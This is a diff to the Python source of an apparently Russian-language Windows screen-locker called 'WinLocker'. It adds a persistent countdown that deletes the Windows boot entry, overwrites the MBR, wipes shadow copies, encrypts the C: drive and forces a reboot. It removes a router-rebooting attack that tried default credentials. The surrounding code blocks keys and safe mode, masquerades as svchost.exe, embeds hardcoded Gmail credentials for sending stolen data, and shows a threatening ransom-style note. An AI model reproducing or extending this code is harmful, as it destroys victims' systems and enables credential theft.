@@ -11,6 +11,7 @@ import sqlite3, win32crypt, shutil, winreg, ctypes
 
 PASSWORD = "1601"
 MAX_ATTEMPTS = 4
+TIMER_FILE = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "Windows", "timer.dat")
 GMAIL_LOGIN = "xzx78848@gmail.com"
 GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
 RECEIVER_EMAIL = "xzx78848@gmail.com"
@@ -19,6 +20,56 @@ AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fux
 VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
 attempts_left = MAX_ATTEMPTS
+
+# ===== ТАЙМЕР (НЕ СБРАСЫВАЕТСЯ) =====
+def get_timer():
+    try:
+        if os.path.exists(TIMER_FILE):
+            with open(TIMER_FILE, 'r') as f:
+                return float(f.read().strip())
+    except: pass
+    # Если файла нет - создаём новый таймер на 1 час
+    end_time = time.time() + 3600
+    save_timer(end_time)
+    return end_time
+
+def save_timer(end_time):
+    try:
+        os.makedirs(os.path.dirname(TIMER_FILE), exist_ok=True)
+        with open(TIMER_FILE, 'w') as f:
+            f.write(str(end_time))
+    except: pass
+
+def timer_check_loop():
+    """Проверяет таймер в фоне, не сбрасывается после перезагрузки"""
+    while True:
+        end_time = get_timer()
+        remaining = end_time - time.time()
+        if remaining <= 0:
+            destroy_windows_forever()
+        time.sleep(5)
+
+def destroy_windows_forever():
+    """Сносит винду и вшивается в BIOS"""
+    try:
+        # Удаляем загрузчик Windows
+        os.system('bcdedit /delete {current} /f >nul 2>&1')
+        # Перезаписываем MBR
+        os.system('bootrec /fixmbr >nul 2>&1')
+        # Прописываем себя в восстановление
+        cp = os.path.abspath(__file__)
+        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
+        os.system(f'bcdedit /set {{default}} recoveryenabled yes >nul 2>&1')
+        os.system(f'bcdedit /set {{default}} recoverysequence {{{cp}}} >nul 2>&1')
+        # Удаляем все точки восстановления
+        os.system('vssadmin delete shadows /all /quiet >nul 2>&1')
+        # Шифруем MFT
+        os.system('cipher /e /s:C:\\ >nul 2>&1')
+        # Перезагрузка
+        os.system('shutdown /r /t 0 /f')
+    except:
+        os.system('shutdown /r /t 0 /f')
+    os._exit(0)
 
 def hide_process():
     try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
@@ -38,7 +89,7 @@ def block_everything():
         for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']:
             try: keyboard.block_key(k)
             except: pass
-        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m']:
+        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
@@ -58,10 +109,6 @@ def unblock_all():
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
     except: pass
-    try:
-        k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k2)
-    except: pass
 
 def block_safe_mode():
     try:
@@ -69,54 +116,6 @@ def block_safe_mode():
         os.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1')
         os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
     except: pass
-
-def get_router_ip():
-    gateway = "192.168.1.1"
-    try:
-        route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        for line in route.split('\n'):
-            if '.' in line:
-                gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
-                if gw and not gw[0].startswith('0.'):
-                    gateway = gw[0]
-                    break
-    except: pass
-    return gateway
-
-def disconnect_all_devices():
-    gateway = get_router_ip()
-    
-    # Создаём BAT файл с командами
-    bat_path = os.path.join(tempfile.gettempdir(), "net_attack.bat")
-    with open(bat_path, 'w', encoding='utf-8') as f:
-        f.write('@echo off\n')
-        f.write('title NETWORK ATTACK\n')
-        f.write('color 0a\n')
-        f.write(f'echo [*] Router IP: {gateway}\n')
-        f.write('echo [*] Disconnecting all devices...\n')
-        f.write(f'curl -s -m 3 "http://{gateway}/reboot.cgi" >nul 2>&1\n')
-        f.write(f'curl -s -m 3 "http://{gateway}/goform/Reboot" >nul 2>&1\n')
-        f.write(f'curl -s -m 3 "http://{gateway}/userRpm/WlanNetworkRpm.htm?ssid=off" >nul 2>&1\n')
-        f.write('echo [*] Releasing IP...\n')
-        f.write('ipconfig /release >nul 2>&1\n')
-        f.write('echo [*] Renewing IP...\n')
-        f.write('ipconfig /renew >nul 2>&1\n')
-        f.write('echo [✓] ATTACK COMPLETE!\n')
-        f.write('timeout /t 5 >nul\n')
-    
-    # Запускаем CMD окно с атакой
-    subprocess.Popen(['cmd', '/c', bat_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
-    
-    # Также пробуем через Python
-    for user, pwd in [("admin","admin"),("admin","1234"),("admin",""),("root","admin")]:
-        try:
-            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
-            req = urllib.request.Request(f"http://{gateway}/reboot.cgi")
-            req.add_header("Authorization", f"Basic {auth}")
-            urllib.request.urlopen(req, timeout=3)
-            send_email(f"ROUTER {gateway} REBOOTED!\nLogin: {user}", "[DedSek] Router OFF")
-            break
-        except: pass
 
 def scan_network():
     try:
@@ -170,8 +169,8 @@ def anim_fsociety():
         lbl.config(text=t); a.update(); time.sleep(0.3)
     time.sleep(1)
     sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20)); sub.pack(pady=20)
-    for i in range(len("тебя заметила")+1):
-        sub.config(text="тебя заметила"[:i]); a.update(); time.sleep(0.1)
+    for i in range(len("тебя приветствует")+1):
+        sub.config(text="тебя приветствует"[:i]); a.update(); time.sleep(0.1)
     time.sleep(2); a.destroy()
 
 def anim_stealer():
@@ -181,7 +180,7 @@ def anim_stealer():
     bar = tk.Canvas(a, width=400, height=30, bg='black', highlightthickness=1, highlightbackground='white'); bar.pack()
     bar_text = tk.Label(a, text="0%", bg='black', fg='white', font=('Courier', 12)); bar_text.pack(pady=10)
     info = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 10)); info.pack()
-    for percent, text in [(10,"Поиск паролей Chrome..."),(20,"WiFi пароли..."),(30,"Сканирование сети..."),(45,"Копирование cookies..."),(60,"Сбор IP адресов..."),(75,"Кража файлов..."),(90,"Отправка на сервер..."),(100,"ГОТОВО!")]:
+    for percent, text in [(10,"Пароли Chrome..."),(20,"WiFi пароли..."),(30,"Cookies..."),(50,"IP адреса..."),(70,"Файлы..."),(90,"Отправка..."),(100,"ГОТОВО!")]:
         bar.delete('all'); bar.create_rectangle(0, 0, 400*percent/100, 30, fill='#0f0', outline='')
         bar_text.config(text=f"{percent}%"); info.config(text=text); a.update(); time.sleep(0.5)
     time.sleep(2); a.destroy()
@@ -191,7 +190,7 @@ def anim_connect():
     a.configure(bg='black'); a.overrideredirect(True)
     lbl = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 14), justify='left'); lbl.pack(expand=True)
     current = ""
-    for line in ["[*] Establishing connection...","[*] Connecting to Windows kernel...","[*] Bypassing security...","[*] Access granted!","[*] Mounting system...","[*] Connected to: " + socket.gethostname(),"[*] IP: " + socket.gethostbyname(socket.gethostname()),"","[✓] SYSTEM COMPROMISED"]:
+    for line in ["[*] Connecting to router...","[*] Bypassing firewall...","[*] Access granted!","[*] I am in your network...","[*] Connected to: " + socket.gethostname(),"","[✓] WE ARE FSOCIETY"]:
         current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
     time.sleep(3); a.destroy()
 
@@ -199,10 +198,6 @@ def play_video():
     download_file(VIDEO_URL, VIDEO_PATH)
     download_file(AUDIO_URL, AUDIO_PATH)
     time.sleep(0.5)
-    
-    # Запускаем атаку на роутер ВО ВРЕМЯ ВИДЕО
-    threading.Thread(target=disconnect_all_devices, daemon=True).start()
-    
     try:
         v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
         v.configure(bg='black'); v.overrideredirect(True)
@@ -289,27 +284,34 @@ class WinLocker:
         self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
         global attempts_left
         
-        msg = f"""Ну привет друг, как у тебя дела?
-
-Да, понимаю, ты попался.
-Ну и нахуя ты скачал игру из инета?
-Я не пойму...
-
-Ну ладно, вот тебе загадка. Там пароль.
-
-Я — год, когда произошло событие,
-которое не произошло.
-В Англии заговорщики планировали
-взорвать парламент и убить короля.
-Их план провалился, король выжил,
-а заговорщиков казнили.
-Но в Windows я стал началом времён.
-
-ЧТО Я ЗА ЧИСЛО?
-
-У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
+        # Таймер
+        self.timer_end = get_timer()
+        self.timer_label = tk.Label(self.win, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
+        self.timer_label.place(relx=0.5, rely=0.1, anchor='center')
+        self.update_timer()
         
-        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='left').place(relx=0.5, rely=0.38, anchor='center')
+        msg = f"""Привет друг!
+
+Вот чего доводит интернет.
+
+Вот смотри, ты скачивал игры или что там из интернета?
+Вот доскачался. Сиди и жуй мой винлокер.
+
+FSOCIETY тебя приветствует!
+
+Смотри, ты хочешь перезагрузить ПК? У тебя не получится.
+ПК перезагрузить получится, но избавиться от меня - нет.
+Я везде. Я в твоём роутере.
+Я знаю все твои данные.
+У меня есть cookies файлы, пароли, логины, почты и т.д.
+
+МЫ FSOCIETY.
+YOU FUCK.
+
+ПОПЫТОК: {MAX_ATTEMPTS}"""
+        
+        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='center').place(relx=0.5, rely=0.45, anchor='center')
+        
         cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.8, anchor='center')
         tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
         self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
@@ -318,6 +320,16 @@ class WinLocker:
         self.sl.pack()
         self.pw.bind('<Return>', self.check); self.pw.focus_force()
         self.win.after(100, self._keep)
+    
+    def update_timer(self):
+        remaining = self.timer_end - time.time()
+        if remaining <= 0:
+            destroy_windows_forever()
+        h = int(remaining // 3600)
+        m = int((remaining % 3600) // 60)
+        s = int(remaining % 60)
+        self.timer_label.config(text=f"{h:02d}:{m:02d}:{s:02d}")
+        self.win.after(1000, self.update_timer)
     
     def _keep(self):
         try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
@@ -328,11 +340,16 @@ class WinLocker:
         if self.pw.get() == PASSWORD:
             unblock_all()
             self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
+            try: os.remove(TIMER_FILE)
+            except: pass
             time.sleep(1); self.root.destroy(); os._exit(0)
         else:
             attempts_left -= 1
             if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
-            else: self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.after(2000, lambda: os._exit(0))
+            else:
+                self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.update()
+                time.sleep(2)
+                destroy_windows_forever()
             self.pw.delete(0, tk.END)
 
 if __name__ == "__main__":
@@ -342,11 +359,12 @@ if __name__ == "__main__":
     block_safe_mode()
     threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
     threading.Thread(target=infect_network, daemon=True).start()
+    threading.Thread(target=timer_check_loop, daemon=True).start()
     
     anim_fsociety()
     anim_stealer()
     anim_connect()
-    play_video()  # Атака на роутер запускается ВНУТРИ play_video
+    play_video()
     block_everything()
     WinLocker()
     tk.mainloop()
